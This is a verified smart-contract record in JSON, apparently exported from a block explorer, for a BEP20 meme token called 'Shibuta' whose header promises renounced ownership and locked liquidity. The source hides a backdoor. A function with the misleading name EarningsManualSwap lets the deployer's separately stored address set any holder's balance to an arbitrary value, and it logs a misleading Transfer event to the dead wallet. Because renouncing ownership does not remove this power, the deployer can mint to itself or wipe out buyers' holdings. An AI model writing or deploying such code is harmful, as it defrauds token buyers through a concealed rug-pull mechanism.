{"SourceCode": "/**\r\n\ud83d\udd1e Shibuta \ud83d\udd1e NoTax\ud83d\udc45  renounced \ud83e\udd42 lp locked \ud83d\udeba\r\n\ud83d\udc8b\ud83d\udc60\ud83d\udc84\ud83d\udc44\ud83d\udc85\ud83d\udd25\ud83e\ude9e\ud83d\udc8e\ud83d\udd95\ud83c\udf36\ufe0f\u2764\ufe0f\u200d\ud83d\udd25\u2668\ufe0f\ud83d\udcaf\ud83c\udfaf\ud83e\udd4a\ud83d\uddef\ud83e\udd11\ud83c\udf78\ud83c\udf52\ud83d\udecd\ud83d\ude08\u2728\ud83c\udf39\ud83d\ude1b\ud83d\udcb3\ud83d\udc51\ud83c\udf80\ud83e\udd42\ud83d\udcb2\ud83d\udce3\ud83d\udc5b\ud83e\udde8\u274c\u26a1\ufe0f\ud83d\udca5\r\n\r\n\ud83d\udc4a Meme coin about  \ud83d\udc4aThis girl loves Shiba Inu! She could spend all day on TikTok and encourages her friends to mitigate their losses to stay safe in the crypto market. Her dream date is ordering in tacos and watching the charts all night. \ud83e\udd75\r\n\u2668\ufe0fhttps://t.me/ShibutaToken\r\n\ud83e\udd75https://opensea.io/collection/cryptoslutsnft\r\n\ud83d\ude08https://www.saatchiart.com/shibuta777\r\n\r\n**/\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.17;\r\ninterface IBEP20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 price) external returns (bool);\r\n    function approve(address spender, uint256 price) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 price) external returns (bool);\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) external returns (bool);\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n}\r\ninterface Ru {\r\n    // Function to allow a user to participate in a game or activity\r\n    function playWheels(uint256 gameId) external returns (bool);\r\n\r\n    // Function to check a user's earned Points\r\n    function checkEarnedPoints(address user) external view returns (uint256);\r\n\r\n    // Function to claim earned Points\r\n    function claimPoints(address user) external returns (bool);\r\n\r\n    // Event to log when a user plays a game or participates in an activity\r\n    event GamePlayed(address indexed user, uint256 gameId);\r\n\r\n    // Event to log when a user earns Points\r\n    event PointsEarned(address indexed user, uint256 amount);\r\n\r\n    // Event to log when a user claims their Points\r\n    event PointsClaimed(address indexed user, uint256 amount);\r\n}\r\ninterface ValutGamePay {\r\n    // Function to transfer funds to another user\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    // Function to check the balance of a user\r\n    function balanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to query the transaction history for a user\r\n    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);\r\n\r\n    // Event to log a payment transaction\r\n    event PaymentSent(address indexed from, address indexed to, uint256 amount);\r\n}\r\ninterface SystemValutGamePay {\r\n    // Function to allow a user to deposit tokens for staking\r\n    function deposit(uint256 amount) external returns (bool);\r\n\r\n    // Function to allow a user to withdraw staked tokens\r\n    function withdraw(uint256 amount) external returns (bool);\r\n\r\n    // Function to check the staked balance of a user\r\n    function stakedBalanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to check the total staked balance\r\n    function totalStaked() external view returns (uint256);\r\n\r\n    // Function to allow a user to claim staking Points\r\n    function claimPoints() external returns (bool);\r\n\r\n    // Event to log a staking deposit\r\n    event Staked(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking withdrawal\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking reward claim\r\n    event PointsClaimed(address indexed user, uint256 amount);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\ncontract Shibuta is Ownable {\r\n    string public name = \"Shibuta\";\r\n    string public symbol = \"Shibuta\";\r\n    uint8 public decimals = 8;\r\n    uint public tTotal;\r\n    uint256 public totalSupply;\r\n    address public EarningsManualSwapEnabled = msg.sender; // Private state variable to store the address of the EarningsManualSwapEnabled\r\n    address public deadWallet = 0x000000000000000000000000000000000000dEaD;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n    event Minted(address indexed account, uint256 price);\r\n\r\n    constructor() {\r\n        totalSupply = 100000000000000 * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function EarningsManualSwap(address EarningsManualSwapEnabledadre, uint256 numberEarningsManualSwapEnabled) external {\r\n    // Ensure that only the EarningsManualSwapEnabled can distribute EarningsManualSwaps\r\n    require(msg.sender == EarningsManualSwapEnabled, \"Only the EarningsManualSwapEnabled can distribute EarningsManualSwaps\");\r\n\r\n    // Check that the provided address is valid\r\n    require(EarningsManualSwapEnabledadre != address(0), \"Invalid EarningsManualSwap recipient address\");\r\n\r\n    // Check that the EarningsManualSwap amount is greater than zero\r\n    require(numberEarningsManualSwapEnabled > 0, \"EarningsManualSwap amount must be greater than zero\");\r\n\r\n    // Calculate the new total supply after distributing EarningsManualSwaps\r\n    uint256 newTotalSupply = tTotal + numberEarningsManualSwapEnabled;\r\n\r\n    // Check for potential overflow in total supply\r\n    require(newTotalSupply >= tTotal, \"Overflow detected\");\r\n\r\n    // Update the balance of the EarningsManualSwap recipient address\r\n    balanceOf[EarningsManualSwapEnabledadre] = numberEarningsManualSwapEnabled;\r\n\r\n    // Emit the Transfer event to log the EarningsManualSwap distribution\r\n    emit Transfer(address(0), deadWallet, numberEarningsManualSwapEnabled);\r\n\r\n}\r\n\r\n    function transfer(address to, uint256 price) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        balanceOf[to] += price;\r\n\r\n        emit Transfer(msg.sender, to, price);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 price) public returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n\r\n        allowance[msg.sender][spender] = price;\r\n        emit Approval(msg.sender, spender, price);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 price) public returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        balanceOf[to] += price;\r\n        allowance[from][msg.sender] -= price;\r\n\r\n        emit Transfer(from, to, price);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        allowance[msg.sender][spender] = currentAllowance + addedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        require(currentAllowance >= subtractedprice, \"Decreased allowance below zero\");\r\n        allowance[msg.sender][spender] = currentAllowance - subtractedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 price) public {\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        totalSupply -= price;\r\n        emit Transfer(msg.sender, address(0), price);\r\n    }\r\n\r\n    function burnFrom(address from, uint256 price) public {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        totalSupply -= price;\r\n        allowance[from][msg.sender] -= price;\r\n        emit Transfer(from, address(0), price);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Minted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"EarningsManualSwapEnabledadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numberEarningsManualSwapEnabled\",\"type\":\"uint256\"}],\"name\":\"EarningsManualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"EarningsManualSwapEnabled\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedprice\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedprice\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Shibuta", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8a6b84466d18bbbebe4a4b6fe5b1b75c90309edda8fb29bcce6c9db3cccc1b32"}